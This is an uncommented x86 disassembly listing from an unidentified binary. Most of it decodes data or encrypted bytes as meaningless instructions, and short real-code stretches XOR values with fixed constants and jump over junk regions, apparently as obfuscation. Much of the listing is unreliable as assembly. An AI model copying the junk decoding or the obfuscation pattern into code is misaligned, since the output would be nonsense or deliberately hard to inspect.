  41dc86:	(bad)  
  41dc87:	add    bl,al
  41dc89:	adc    eax,0xbd550d35
  41dc8e:	push   esi
  41dc8f:	repz and ah,al
  41dc92:	cmp    ebx,DWORD PTR [edi]
  41dc94:	sub    al,0x41
  41dc96:	push   esp
  41dc97:	dec    edx
  41dc98:	aas    
  41dc99:	pop    ss
  41dc9a:	mov    dl,0x98
  41dc9c:	addr16 mov bl,0x17
  41dc9f:	and    ah,ch
  41dca1:	pop    ecx
  41dca2:	ds scas al,BYTE PTR es:[edi]
  41dca4:	ds inc eax
  41dca6:	addr16 mov esp,0xe5908d96
  41dcac:	fst    QWORD PTR [edx+edx*1-0x71]
  41dcb0:	cmp    ecx,DWORD PTR [edx-0x2daaeb7a]
  41dcb6:	sbb    eax,0x2764faca
  41dcbb:	shl    DWORD PTR [bp-0x71e0],1
  41dcc0:	add    eax,0xee7e9e54
  41dcc5:	mov    cl,0x3c
  41dcc7:	xor    DWORD PTR [ebx+esi*4],0x84abb56c
  41dcce:	fiadd  DWORD PTR [edx+0x5441b5dc]
  41dcd4:	cmp    dh,bh
  41dcd6:	mov    BYTE PTR [eax-0xa99a124],ch
  41dcdc:	ja     0x41dced
  41dcde:	or     al,0x42
  41dce0:	int3   
  41dce1:	mov    bl,0x62
  41dce3:	std    
  41dce4:	mov    al,0x96
  41dce6:	inc    esp
  41dce7:	xor    edx,DWORD PTR ds:0x13cedebd
  41dced:	in     al,dx
  41dcee:	neg    DWORD PTR [ebx]
  41dcf0:	test   DWORD PTR [ecx+0x11],esp
  41dcf3:	mov    eax,ds:0x22a07fe2
  41dcf8:	mov    eax,ds:0xa423350a
  41dcfd:	adc    al,BYTE PTR [edx-0x69]
  41dd00:	add    cl,0xd6
  41dd03:	jp     0x41dd83
  41dd05:	bnd ret 
  41dd07:	out    dx,al
  41dd08:	xchg   edx,eax
  41dd09:	jecxz  0x41dd4d
  41dd0b:	dec    ebx
  41dd0c:	add    BYTE PTR [edx-0x102027e1],dh
  41dd12:	xchg   edi,eax
  41dd13:	inc    esi
  41dd14:	push   cs
  41dd15:	push   0xc3d6d222
  41dd1a:	out    0x17,eax
  41dd1c:	jmp    0xf585c020
  41dd21:	fistp  WORD PTR [eax+0x36efc121]
  41dd27:	shl    ah,cl
  41dd29:	xchg   DWORD PTR [ebp+eax*1+0x66f383fa],ebx
  41dd30:	mov    eax,0x78787705
  41dd35:	es sahf 
  41dd37:	pop    eax
  41dd38:	pop    ecx
  41dd39:	and    edx,DWORD PTR [edx]
  41dd3b:	jns    0x41dd23
  41dd3d:	xchg   ebp,eax
  41dd3e:	pop    eax
  41dd3f:	pop    edi
  41dd40:	cli    
  41dd41:	call   0xfcfe:0x3cae6b9b
  41dd48:	add    al,0x17
  41dd4a:	push   0x8c35e084
  41dd4f:	nop
  41dd50:	adc    ch,BYTE PTR [eax-0x25dcc9e4]
  41dd56:	out    dx,al
  41dd57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd58:	int    0x15
  41dd5a:	mov    al,ds:0x4de64aeb
  41dd5f:	lds    edi,FWORD PTR [ebx+0x346e39a]
  41dd65:	sbb    al,0x2
  41dd67:	adc    al,0x49
  41dd69:	xor    eax,0xd774794e
  41dd6e:	xchg   esp,eax
  41dd6f:	cmp    eax,0x1a8b3a7
  41dd74:	imul   esp,ebp,0xfffffff4
  41dd77:	mov    esp,0x30092b4e
  41dd7c:	iret   
  41dd7d:	scas   al,BYTE PTR es:[edi]
  41dd7e:	leave  
  41dd7f:	mov    dh,0x7e
  41dd81:	jns    0x41dda4
  41dd83:	dec    edx
  41dd84:	mov    bh,0x1b
  41dd86:	and    al,0xfa
  41dd88:	or     edi,edx
  41dd8a:	dec    edi
  41dd8b:	dec    edi
  41dd8c:	ret    
  41dd8d:	push   es
  41dd8e:	(bad)  
  41dd8f:	xor    ebx,esp
  41dd91:	mov    esp,0x767fb63a
  41dd96:	int3   
  41dd97:	push   edi
  41dd98:	add    eax,0xaad8cdfd
  41dd9d:	in     al,0x23
  41dd9f:	cmp    eax,0xcabe7687
  41dda4:	xchg   BYTE PTR [ebx+0x29c465c0],al
  41ddaa:	into   
  41ddab:	or     DWORD PTR [edx-0x61cb0184],esi
  41ddb1:	std    
  41ddb2:	mov    al,0xa9
  41ddb4:	mov    ebp,0x215adec8
  41ddb9:	loop   0x41dd58
  41ddbb:	inc    esi
  41ddbc:	push   0x969908cf
  41ddc1:	mov    al,BYTE PTR gs:[esi]
  41ddc4:	mov    WORD PTR [ecx+edx*2],gs
  41ddc7:	dec    esp
  41ddc8:	cmp    ebp,DWORD PTR [ebp-0x3a]
  41ddcb:	retf   
  41ddcc:	in     eax,0xb7
  41ddce:	ds dec eax
  41ddd0:	fistp  WORD PTR [edi+ebp*1]
  41ddd3:	sbb    eax,0x249e5d09
  41ddd8:	adc    esp,DWORD PTR [edi-0x4aed8e37]
  41ddde:	mov    ecx,0x6f92ea2e
  41dde3:	push   ebx
  41dde4:	sbb    DWORD PTR [esi+0xc],esp
  41dde7:	cmp    dh,ch
  41dde9:	cli    
  41ddea:	pop    es
  41ddeb:	repz retf 0x3fb1
  41ddef:	out    0xf3,al
  41ddf1:	ret    0x52fd
  41ddf4:	rcl    BYTE PTR [edi-0x5b53ffa9],1
  41ddfa:	sbb    BYTE PTR [edx],al
  41ddfc:	jo     0x41de23
  41ddfe:	mov    eax,0x8aa734b8
  41de03:	leave  
  41de04:	rol    DWORD PTR [edi],1
  41de06:	dec    esi
  41de07:	enter  0x4366,0x29
  41de0b:	ins    BYTE PTR es:[edi],dx
  41de0c:	stc    
  41de0d:	and    esp,DWORD PTR [esp+ebx*1]
  41de10:	scas   eax,DWORD PTR es:[edi]
  41de11:	out    dx,al
  41de12:	ret    0xdebe
  41de15:	scas   eax,DWORD PTR es:[edi]
  41de16:	lahf   
  41de17:	xor    al,0x96
  41de19:	hlt    
  41de1a:	sbb    BYTE PTR [eax+ebp*4-0xb],bh
  41de1e:	jle    0x41de65
  41de20:	aam    0xef
  41de22:	xor    eax,0xcb79b576
  41de27:	xor    edx,0x9c2b8ae8
  41de2d:	mov    cl,0x2
  41de2f:	call   0x408bb8
  41de34:	mov    ecx,edx
  41de36:	mov    edx,DWORD PTR [ebp-0x15c]
  41de3c:	mov    DWORD PTR [ebp-0x218],esi
  41de42:	mov    esi,DWORD PTR [ebp-0x158]
  41de48:	xor    edx,0xcb79b576
  41de4e:	xor    esi,0x9c2b8ae8
  41de54:	mov    DWORD PTR [ebp-0x21c],eax
  41de5a:	mov    eax,edx
  41de5c:	mov    edx,esi
  41de5e:	mov    DWORD PTR [ebp-0x220],ecx
  41de64:	mov    cl,0x3e
  41de66:	call   0x4223f7
  41de6b:	mov    esi,DWORD PTR [ebp-0x21c]
  41de71:	or     esi,eax
  41de73:	mov    eax,DWORD PTR [ebp-0x220]
  41de79:	or     eax,edx
  41de7b:	push   eax
  41de7c:	push   esi
  41de7d:	push   ebx
  41de7e:	push   edi
  41de7f:	call   0x41594e
  41de84:	mov    esi,DWORD PTR [ebp-0x218]
  41de8a:	cmp    esi,eax
  41de8c:	jne    0x41df42
  41de92:	mov    eax,DWORD PTR [ebp-0x154]
  41de98:	mov    edx,DWORD PTR [ebp-0x150]
  41de9e:	xor    eax,0xcb79b576
  41dea3:	xor    edx,0x9c2b8ae8
  41dea9:	mov    cl,0x2
  41deab:	call   0x408bb8
  41deb0:	mov    esi,eax
  41deb2:	mov    edi,edx
  41deb4:	mov    eax,DWORD PTR [ebp-0x154]
  41deba:	mov    edx,DWORD PTR [ebp-0x150]
  41dec0:	xor    eax,0xcb79b576
  41dec5:	xor    edx,0x9c2b8ae8
  41decb:	mov    cl,0x3e
  41decd:	call   0x4223f7
  41ded2:	or     esi,eax
  41ded4:	or     edi,edx
  41ded6:	mov    eax,DWORD PTR [ebp-0x15c]
  41dedc:	mov    edx,DWORD PTR [ebp-0x158]
  41dee2:	xor    eax,0xcb79b576
  41dee7:	xor    edx,0x9c2b8ae8
  41deed:	mov    cl,0x2
  41deef:	call   0x408bb8
  41def4:	mov    ebx,eax
  41def6:	mov    eax,edx
  41def8:	mov    ecx,DWORD PTR [ebp-0x15c]
  41defe:	mov    edx,DWORD PTR [ebp-0x158]
  41df04:	xor    ecx,0xcb79b576
  41df0a:	xor    edx,0x9c2b8ae8
  41df10:	mov    DWORD PTR [ebp-0x224],eax
  41df16:	mov    eax,ecx
  41df18:	mov    cl,0x3e
  41df1a:	call   0x4223f7
  41df1f:	or     ebx,eax
  41df21:	mov    eax,DWORD PTR [ebp-0x224]
  41df27:	or     eax,edx
  41df29:	push   eax
  41df2a:	push   ebx
  41df2b:	push   edi
  41df2c:	push   esi
  41df2d:	call   0x41594e
  41df32:	mov    DWORD PTR [ebp-0x178],eax
  41df38:	jmp    0x41f19e
  41df3d:	jmp    0x41f154
  41df42:	lea    eax,[ebp-0x168]
  41df48:	mov    DWORD PTR [ebp-0x164],eax
  41df4e:	mov    eax,DWORD PTR [ebp-0x164]
  41df54:	mov    DWORD PTR [eax],0xa5069bae
  41df5a:	mov    eax,DWORD PTR [ebp-0x168]
  41df60:	xor    eax,0xa5069bae
  41df65:	shr    eax,0x2
  41df68:	mov    ecx,DWORD PTR [ebp-0x168]
  41df6e:	xor    ecx,0xa5069bae
  41df74:	shl    ecx,0x1e
  41df77:	or     eax,ecx
  41df79:	mov    ecx,DWORD PTR [ebp-0x174]
  41df7f:	mov    eax,DWORD PTR [ecx+eax*8+0x78]
  41df83:	mov    DWORD PTR [ebp-0x160],eax
  41df89:	mov    esi,DWORD PTR [ebp-0x160]
  41df8f:	mov    eax,DWORD PTR [ebp-0x154]
  41df95:	mov    edx,DWORD PTR [ebp-0x150]
  41df9b:	xor    eax,0xcb79b576
  41dfa0:	xor    edx,0x9c2b8ae8
  41dfa6:	mov    cl,0x2
  41dfa8:	call   0x408bb8
  41dfad:	mov    edi,eax
  41dfaf:	mov    ebx,edx
  41dfb1:	mov    eax,DWORD PTR [ebp-0x154]
  41dfb7:	jmp    0x41e39e
  41dfbc:	mov    bl,0xa1
  41dfbe:	mov    eax,ds:0xbba5b3a5
  41dfc3:	mov    ebx,0xd1567b79
  41dfc8:	iret   
  41dfc9:	jge    0x41e049
  41dfcb:	iret   
  41dfcc:	nop
  41dfcd:	pop    edi
  41dfce:	sar    BYTE PTR [esi-0x41413bb6],0xcd
  41dfd5:	test   ebx,0x8768c7c1
  41dfdb:	adc    ebx,esi
  41dfdd:	xchg   ah,ch
  41dfdf:	xor    dl,bh
  41dfe1:	test   ah,bh
  41dfe3:	jo     0x41dffd
  41dfe5:	mov    BYTE PTR [edx-0x606d9251],al
  41dfeb:	xor    al,BYTE PTR [edx+0x2e]
  41dfee:	mov    cs,WORD PTR [eax+0x12]
  41dff1:	ss inc ebp
  41dff3:	aas    
  41dff4:	ret    
  41dff5:	jnp    0x41e035
  41dff7:	cwde   
  41dff8:	pop    ebp
  41dff9:	xor    DWORD PTR [ecx],eax
  41dffb:	pop    edi
  41dffc:	mov    esi,0xefa53d6d
  41e001:	retf   0xd598
  41e004:	pop    edi
  41e005:	nop
  41e006:	cmp    ch,BYTE PTR [ecx]
  41e008:	jmp    0x41dfc2
  41e00a:	xchg   BYTE PTR [ebx+0x22],bl
  41e00d:	jns    0x41e017
  41e00f:	int3   
  41e010:	jp     0x41e071
  41e012:	popa   
  41e013:	inc    eax
  41e014:	mov    ch,ah
  41e016:	in     al,dx
  41e017:	lea    edx,[eax-0x8]
  41e01a:	jo     0x41dfbc
  41e01c:	xchg   DWORD PTR [ecx],eax
  41e01e:	not    BYTE PTR [eax]
  41e020:	add    al,BYTE PTR [eax-0x2b]
  41e023:	push   0x28263da9
  41e028:	in     al,dx
  41e029:	jg     0x41e0a0
  41e02b:	jp     0x41e031
  41e02d:	hlt    
  41e02e:	push   ecx
  41e02f:	jb     0x41e02a
  41e031:	and    eax,0xb8ab7756
  41e036:	xor    DWORD PTR [eax+0x1a66a604],ebp
  41e03c:	jno    0x41dfeb
  41e03e:	and    eax,DWORD PTR [ebp-0x5e257c13]
  41e044:	jle    0x41e04a
  41e046:	push   ecx
  41e047:	sbb    edx,ecx
  41e049:	retf   
  41e04a:	mov    cs,edi
  41e04c:	add    bh,bl
  41e04e:	sbb    DWORD PTR [ecx],esi
  41e050:	cld    
  41e051:	pop    ebp
  41e052:	fst    QWORD PTR [edx+0x12]
  41e055:	fcmovu st,st(2)
  41e057:	hlt    
  41e058:	xlat   BYTE PTR ds:[ebx]
  41e059:	retf   
  41e05a:	add    eax,0x24c91242
  41e05f:	mov    ch,0xf1
  41e061:	lahf   
  41e062:	rcl    BYTE PTR [esi-0x1dc62b91],0x56
  41e069:	out    dx,al
  41e06a:	ja     0x41e028
  41e06c:	arpl   WORD PTR [ebp+0x5c],bp
  41e06f:	test   BYTE PTR [ebx-0x13],dh
  41e072:	stos   DWORD PTR es:[edi],eax
  41e073:	inc    DWORD PTR [edi+0x67c0f2a4]
  41e079:	mov    dl,0xa3
  41e07b:	mov    edi,0x72e5ed71
  41e080:	shr    BYTE PTR [edx-0x3a8a7d3d],cl
  41e086:	ja     0x41e066
  41e088:	mov    DWORD PTR [eax-0x7f],esi
  41e08b:	sbb    BYTE PTR [ecx+0x54],dh
  41e08e:	sub    edx,DWORD PTR [edi-0x563040ef]
  41e094:	sbb    BYTE PTR [ebx+0x6c8a61d0],al
  41e09a:	das    
  41e09b:	and    BYTE PTR [ebp+0x33fa9a7a],cl
  41e0a1:	aam    0x4
  41e0a3:	pop    eax
  41e0a4:	jmp    0x41e123
  41e0a6:	xchg   edx,eax
  41e0a7:	pop    ds
  41e0a8:	iret   
  41e0a9:	int    0x9a
  41e0ab:	xor    BYTE PTR [edi+0x31b90e87],al
  41e0b1:	dec    ecx
  41e0b2:	jbe    0x41e078
  41e0b4:	das    
  41e0b5:	aas    
  41e0b6:	out    dx,eax
  41e0b7:	fiadd  WORD PTR [edx-0x38547c31]
  41e0bd:	pop    eax
  41e0be:	jge    0x41e054
  41e0c0:	cwde   
  41e0c1:	adc    al,BYTE PTR ds:0x457f14a6
  41e0c7:	clc    
  41e0c8:	mov    esp,0x8ce9b629
  41e0cd:	dec    esi
  41e0ce:	loope  0x41e0f0
  41e0d0:	aam    0xe6
  41e0d2:	inc    esi
  41e0d3:	jmp    0x4b52a7d4
  41e0d8:	mov    edi,0xec3fc72d
  41e0dd:	jbe    0x41e100
  41e0df:	stc    
  41e0e0:	aam    0x32
  41e0e2:	xchg   ebp,eax
  41e0e3:	mov    ds,WORD PTR [ebp+0x6f6c42e3]
  41e0e9:	in     eax,0x86
  41e0eb:	lds    edi,FWORD PTR [edi-0x368cd35e]
  41e0f1:	fsqrt  
  41e0f3:	mov    es,WORD PTR [ecx+0x6d]
  41e0f6:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  41e0f8:	and    DWORD PTR [ebp+0x418a831c],edi
  41e0fe:	cmc    
  41e0ff:	mov    eax,?
  41e101:	jno    0x41e08f
  41e103:	dec    ebp
  41e104:	js     0x41e0dd
  41e106:	sbb    ch,BYTE PTR [esi]
  41e108:	jl     0x41e0c9
  41e10a:	loopne 0x41e13c
  41e10c:	push   edx
  41e10d:	stc    
  41e10e:	xor    DWORD PTR ds:0x91bb880c,0x450c75bb
  41e118:	icebp  
  41e119:	cmp    bl,ah
  41e11b:	and    ah,ah
  41e11d:	mov    ebp,esp
  41e11f:	mov    cl,0x5f
  41e121:	cwde   
  41e122:	outs   dx,DWORD PTR ds:[esi]
  41e123:	fstp   DWORD PTR [ebp+0x55]
  41e126:	ret    0x5d39
  41e129:	jl     0x41e112
  41e12b:	retf   
  41e12c:	add    cl,bh
  41e12e:	hlt    
  41e12f:	inc    esp
  41e130:	xchg   ebx,eax
  41e131:	lock retf 0x139e
  41e135:	sub    eax,0x8aa79d4d
  41e13a:	sbb    BYTE PTR [eax-0x10],0xe3
  41e13e:	cmp    ah,BYTE PTR [eax]
  41e140:	stc    
  41e141:	jge    0x41e101
  41e143:	cmp    edi,eax
  41e145:	jecxz  0x41e143
  41e147:	(bad)  
  41e148:	xchg   esp,eax
  41e149:	call   0xa438:0x4af2316e
  41e150:	nop
  41e151:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e152:	dec    ecx
  41e153:	add    eax,esi
  41e155:	dec    esp
  41e156:	and    ebp,DWORD PTR [esi+0x21cd026a]
  41e15c:	mov    esi,0x23baf4f0
  41e161:	pop    eax
  41e162:	popa   
  41e163:	ret    
  41e164:	push   ds
  41e165:	add    al,0x56
  41e167:	cmp    bh,BYTE PTR [ebx-0x753329c7]
  41e16d:	mov    ah,0x59
  41e16f:	(bad)  
  41e170:	mov    dl,0xb5
  41e172:	mov    ecx,0x8f9b25fc
  41e177:	and    DWORD PTR [eax-0x2b],ebp
  41e17a:	mov    eax,ds:0x9f29f672
  41e17f:	sahf   
  41e180:	sbb    dl,al
  41e182:	add    al,0xf6
  41e184:	mov    eax,ds:0xcd52fcfc
  41e189:	(bad)  
  41e18a:	retf   0x2da2
  41e18d:	cmp    dh,dl
  41e18f:	push   edx
  41e190:	leave  
  41e191:	jle    0x41e1de
  41e193:	lods   al,BYTE PTR ds:[esi]
  41e194:	mov    esi,0xae478120
  41e199:	cli    
  41e19a:	jo     0x41e1e1
  41e19c:	test   eax,0x3543c25
  41e1a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e1a2:	or     ch,dl
  41e1a4:	jbe    0x41e1f6
  41e1a6:	(bad)  
  41e1a7:	lahf   
  41e1a8:	xor    al,0x8f
  41e1aa:	enter  0x52d5,0x26
  41e1ae:	fst    QWORD PTR [edx]
  41e1b0:	mov    al,ds:0x37aaf378
  41e1b5:	into   
  41e1b6:	fld    st(2)
  41e1b8:	shl    BYTE PTR [esi+0x72],1
  41e1bb:	cdq    
  41e1bc:	rol    DWORD PTR fs:[edi-0x7a9caa1b],cl
  41e1c3:	retf   0x50a
  41e1c6:	cld    
  41e1c7:	push   ecx
  41e1c8:	shl    ch,1
  41e1ca:	and    esp,DWORD PTR [edx-0x24991734]
  41e1d0:	dec    ecx
  41e1d1:	mov    eax,ds:0x1fe0367d
  41e1d6:	or     DWORD PTR [ebx-0x2f586c71],edx
  41e1dc:	push   eax
  41e1dd:	xor    ebx,ebp
  41e1df:	cmc    
  41e1e0:	shl    BYTE PTR [eax*1-0x7bf75f23],0xf8
  41e1e8:	ins    DWORD PTR es:[edi],dx
  41e1e9:	jle    0x41e1d2
  41e1eb:	out    0x37,eax
  41e1ed:	les    esi,FWORD PTR [ebp+0x63c3f2bb]
  41e1f3:	ss mov al,0xcd
  41e1f6:	pop    edx
  41e1f7:	leave  
  41e1f8:	and    eax,DWORD PTR [esi+0x29]
  41e1fb:	loopne 0x41e194
  41e1fd:	cmc    
  41e1fe:	pop    edx
  41e1ff:	inc    edi
  41e200:	dec    ecx
  41e201:	add    ebx,DWORD PTR [eax-0x345ff9ca]
  41e207:	repz mov al,0xd4
  41e20a:	retf   
  41e20b:	xor    DWORD PTR [edi-0x754da9b1],0x8e3b4dbf
  41e215:	jmp    0x3979:0x26540e7f
  41e21c:	xlat   BYTE PTR ds:[ebx]
  41e21d:	mov    dh,0xa
  41e21f:	push   DWORD PTR [eax-0x7b]
  41e222:	imul   ebx,edx,0xffffffc5
  41e225:	xchg   esi,eax
  41e226:	xchg   edi,eax
  41e227:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e228:	shl    edx,1
  41e22a:	xor    al,0xf8
  41e22c:	fisubr DWORD PTR [esi]
  41e22e:	cli    
  41e22f:	test   DWORD PTR [eax+0x45],eax
  41e232:	jle    0x41e1e3
  41e234:	jno    0x41e280
  41e236:	sbb    DWORD PTR [ebx],esi
  41e238:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e239:	jbe    0x41e213
  41e23b:	mov    BYTE PTR [edi],dl
  41e23d:	aad    0xaa
  41e23f:	cmp    al,0xeb
  41e241:	ja     0x41e2ba
  41e243:	sub    DWORD PTR [esi+edi*8+0x7b],esi
  41e247:	and    eax,0x958b09cc
  41e24c:	sar    DWORD PTR [esi+0x40c92391],1
  41e252:	add    ch,ch
  41e254:	and    dl,BYTE PTR [edi-0xba1a884]
  41e25a:	cs jbe 0x41e23f
  41e25d:	sti    
  41e25e:	fdiv   st(3),st
  41e260:	mov    edx,esi
  41e262:	add    al,0xaf
  41e264:	(bad)  
  41e265:	or     BYTE PTR [ebx+0x5fe98361],ch
  41e26b:	jbe    0x41e201
  41e26d:	int3   
  41e26e:	mov    cl,0x16
  41e270:	push   ebp
  41e271:	mov    bh,al
  41e273:	sti    
  41e274:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e275:	pop    ecx
  41e276:	fadd   QWORD PTR [ebx+0x4578182e]
  41e27c:	cmp    BYTE PTR [eax+edi*1-0x64],0x92
  41e281:	rcl    ch,1
  41e283:	add    DWORD PTR [ecx],ebx
  41e285:	inc    cx
  41e287:	popa   
  41e288:	pop    esi
  41e289:	loopne 0x41e2dd
  41e28b:	add    dl,0xd7
  41e28e:	jns    0x41e25f
  41e290:	jnp    0x41e2fa
  41e292:	dec    edx
  41e293:	fbld   TBYTE PTR [edx-0x61]
  41e296:	fnstenv [ebx+0x3a]
  41e299:	mov    bh,0xa6
  41e29b:	fistp  DWORD PTR [edx+0x21]
  41e29e:	mov    ch,0x84
  41e2a0:	jecxz  0x41e2f2
  41e2a2:	test   BYTE PTR [ebx*4+0x78eb45fd],dl
  41e2a9:	test   BYTE PTR [esi+edi*8-0x73],ch
  41e2ad:	(bad)  
  41e2ae:	mov    esp,0x6e460cb
  41e2b3:	add    cl,BYTE PTR [eax+0x4d]
  41e2b6:	ret    0xb8af
  41e2b9:	inc    ecx
  41e2ba:	sbb    DWORD PTR [esi-0x5341602b],esp
  41e2c0:	xor    eax,0xdd3ac75f
  41e2c5:	xor    ebp,DWORD PTR [ecx-0x73]
  41e2c8:	adc    esp,esp
  41e2ca:	lea    ebp,[esi+0x6b8edeca]
  41e2d0:	mov    edi,0x9887507b
  41e2d5:	sub    eax,0x862b7cf5
  41e2da:	dec    ebp
  41e2db:	push   ss
  41e2dc:	jmp    0x120e:0x1bfe3e0d
  41e2e3:	pop    es
  41e2e4:	frstor [edx+ecx*8]
  41e2e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e2e8:	cmp    cl,dl
  41e2ea:	and    dh,al
  41e2ec:	popa   
  41e2ed:	inc    edi
  41e2ee:	sar    BYTE PTR [eax],0x39
  41e2f1:	fidivr DWORD PTR [ecx-0x76]
  41e2f4:	adc    al,0x86
  41e2f6:	pop    ecx
  41e2f7:	aam    0x90
  41e2f9:	dec    esp
  41e2fa:	sar    BYTE PTR [edx-0x5b],0x17
  41e2fe:	stos   BYTE PTR es:[edi],al
  41e2ff:	ss push ds
  41e301:	adc    al,0xa4
  41e303:	sbb    dl,BYTE PTR [ebp+eax*2+0x7dd8118f]
  41e30a:	mov    ds:0x6b5130d,al
  41e30f:	jae    0x41e361
  41e311:	ins    BYTE PTR es:[edi],dx
  41e312:	or     al,0xc2
  41e314:	mov    bl,0xb0
  41e316:	inc    ecx
  41e317:	out    0x8a,al
  41e319:	xor    BYTE PTR [edi+0x1f],dh
  41e31c:	pop    ecx
  41e31d:	cwde   
  41e31e:	in     al,dx
  41e31f:	pop    eax
  41e320:	mov    esi,0x4909c9ab
  41e325:	mov    dl,0xdf
  41e327:	adc    edi,DWORD PTR [ebp+0x7e]
  41e32a:	xchg   DWORD PTR [eax+eiz*4],esi
  41e32d:	mov    ds:0x6011aff9,eax
  41e332:	pop    ebp
  41e333:	push   edi
  41e334:	jae    0x41e2be
  41e336:	nop
  41e337:	cmp    esi,ebp
  41e339:	and    bh,ch
  41e33b:	jno    0x41e33a
  41e33d:	pop    ecx
  41e33e:	fiadd  WORD PTR [eax+0x38]
  41e341:	test   al,0xa3
  41e343:	and    BYTE PTR [ecx+0x49880bc6],al
  41e349:	ror    ecx,cl
  41e34b:	mov    ecx,0xcae7fe22
  41e350:	(bad)  
  41e351:	jae    0x41e3c3
  41e353:	pusha  
  41e354:	cmc    
  41e355:	retf   0xd37c
  41e358:	dec    ebx
  41e359:	mov    ds:0x811b3823,al
  41e35e:	and    ch,BYTE PTR [edx-0x7c1f6605]
  41e364:	xor    edi,DWORD PTR [esi]
  41e366:	loopne 0x41e339
  41e368:	or     BYTE PTR [esi+0x8a06665],dl
  41e36e:	pop    ss
  41e36f:	push   cs
  41e370:	and    DWORD PTR [esi-0x46],edx
  41e373:	xchg   edx,eax
  41e374:	out    dx,al
  41e375:	or     eax,0x28ea966a
  41e37a:	das    
  41e37b:	fsub   st(5),st
  41e37d:	xchg   ebp,eax
  41e37e:	add    eax,DWORD PTR [ecx+0x74]
  41e381:	xor    cl,dl
  41e383:	icebp  
  41e384:	cmc    
  41e385:	mov    BYTE PTR [ebp-0x7e],ch
  41e388:	cli    
  41e389:	push   edi
  41e38a:	push   edx
  41e38b:	test   esp,0x6d72fd2
  41e391:	stos   BYTE PTR es:[edi],al
  41e392:	cwde   
  41e393:	add    edi,DWORD PTR [ebx+0x4a]
  41e396:	dec    eax
  41e397:	loop   0x41e3cd
  41e399:	mov    edi,0xe1208da3
  41e39e:	mov    edx,DWORD PTR [ebp-0x150]
  41e3a4:	xor    eax,0xcb79b576
  41e3a9:	xor    edx,0x9c2b8ae8
  41e3af:	mov    cl,0x3e
  41e3b1:	call   0x4223f7
  41e3b6:	or     edi,eax
  41e3b8:	or     ebx,edx
  41e3ba:	mov    eax,DWORD PTR [ebp-0x15c]
  41e3c0:	mov    edx,DWORD PTR [ebp-0x158]
  41e3c6:	xor    eax,0xcb79b576
  41e3cb:	xor    edx,0x9c2b8ae8
  41e3d1:	mov    cl,0x2
  41e3d3:	call   0x408bb8
  41e3d8:	mov    ecx,edx
  41e3da:	mov    edx,DWORD PTR [ebp-0x15c]
  41e3e0:	mov    DWORD PTR [ebp-0x228],esi
  41e3e6:	mov    esi,DWORD PTR [ebp-0x158]
  41e3ec:	xor    edx,0xcb79b576
  41e3f2:	xor    esi,0x9c2b8ae8
  41e3f8:	mov    DWORD PTR [ebp-0x22c],eax
  41e3fe:	mov    eax,edx
  41e400:	mov    edx,esi
  41e402:	mov    DWORD PTR [ebp-0x230],ecx
  41e408:	mov    cl,0x3e
  41e40a:	call   0x4223f7
  41e40f:	mov    esi,DWORD PTR [ebp-0x22c]
  41e415:	or     esi,eax
  41e417:	mov    eax,DWORD PTR [ebp-0x230]
  41e41d:	or     eax,edx
  41e41f:	push   eax
  41e420:	push   esi
  41e421:	jmp    0x41e808
  41e426:	rcl    BYTE PTR [ebp+0x47],cl
  41e429:	cmp    ecx,DWORD PTR [ebx+0x3b]
  41e42c:	mov    cl,0xb7
  41e42e:	scas   eax,DWORD PTR es:[edi]
  41e42f:	xor    ebx,DWORD PTR [ecx+edx*8]
  41e432:	mov    ch,0x4a
  41e434:	test   bh,cl
  41e436:	sbb    al,0x67
  41e438:	sar    BYTE PTR [esi-0x41413bb6],0x75
  41e43f:	leave  
  41e440:	iret   
  41e441:	shl    DWORD PTR [ebp-0x9],0xda
  41e445:	inc    ecx
  41e446:	xchg   ecx,eax
  41e447:	pushf  
  41e448:	mov    ecx,0xb47c2d54
  41e44d:	xor    DWORD PTR [ecx+0x505899b8],0x12ce2a97
  41e457:	or     eax,0xbe7b6a54
  41e45c:	(bad)
  41e460:	or     eax,DWORD PTR ds:0xa156cc5a
  41e466:	ja     0x41e405
  41e468:	jle    0x41e49a
  41e46a:	frstor [eax]
  41e46c:	sbb    BYTE PTR [ebx-0x9],cl
  41e46f:	add    eax,edx
  41e471:	mov    cl,0xda
  41e473:	fbld   TBYTE PTR [eax-0x80]
  41e476:	or     al,0x14
  41e478:	(bad)  
  41e479:	loopne 0x41e46f
  41e47b:	or     DWORD PTR [esi+0x3b57b09a],ecx
  41e481:	pop    edi
  41e482:	rcl    BYTE PTR [esi-0x22aa624b],1
  41e488:	or     BYTE PTR [eax-0x1b],ah
  41e48b:	or     eax,0x3907f58f
  41e490:	ret    0xc89d
  41e493:	inc    ecx
  41e494:	xor    cl,BYTE PTR [edi+0x18]
  41e497:	mov    esi,0xd0b3c509
  41e49c:	adc    al,0xef
  41e49e:	test   BYTE PTR [eax-0x1e],0x62
  41e4a2:	mov    esp,0xe304d0e6
  41e4a7:	mul    BYTE PTR [eax-0x22]
  41e4aa:	xor    ch,BYTE PTR [ebx-0x30]
  41e4ad:	loop   0x41e4af
  41e4af:	les    eax,FWORD PTR [ecx-0x111086e1]
  41e4b5:	sub    BYTE PTR [edi-0x5f296840],ah
  41e4bb:	in     eax,dx
  41e4bc:	adc    DWORD PTR [ecx-0x58],esp
  41e4bf:	cli    
  41e4c0:	mov    al,0x91
  41e4c2:	leave  
  41e4c3:	sub    DWORD PTR [ecx+ebp*8-0x57],ebp
  41e4c7:	mov    esi,0x729f458f
  41e4cc:	dec    ecx
  41e4cd:	dec    edi
  41e4ce:	xchg   esp,eax
  41e4cf:	(bad)  
  41e4d0:	leave  
  41e4d1:	retf   
  41e4d2:	pop    ebx
  41e4d3:	ret    0x502a
  41e4d6:	mov    WORD PTR [esi],?
  41e4d8:	and    DWORD PTR [ebp+0x940fc4e],eax
  41e4de:	ret    0x5b4b
  41e4e1:	cmp    al,0x66
  41e4e3:	jmp    0x6a4f:0x4f06cc1f
  41e4ea:	add    BYTE PTR [ebx+0x2ccfa52],bl
  41e4f0:	add    esp,ebp
  41e4f2:	sub    BYTE PTR [ebp-0x60],ch
  41e4f5:	push   ss
  41e4f6:	mov    ah,BYTE PTR [edi-0x7017be88]
